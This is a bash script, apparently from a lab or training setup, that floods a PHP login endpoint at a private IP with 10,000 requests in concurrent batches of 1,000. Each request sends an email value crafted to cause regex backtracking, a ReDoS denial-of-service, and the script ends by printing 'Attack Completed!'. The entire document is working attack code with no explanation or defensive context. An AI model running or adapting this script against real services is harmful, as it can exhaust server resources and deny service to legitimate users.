#!/bin/bash

task(){
    curl -s "http://192.168.154.132/redos/index.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
}

# N-process batches, every batch has N concurrent processes
N=1000

(
# for loop
for (( c=1; c<=10000 ; c++))
	
	do

# wait for N concurrent process to complete
   ((i=i%N)); ((i++==0)) && wait
   
# execute the task concurrently
   task &

done
)

echo "Attack Completed!"
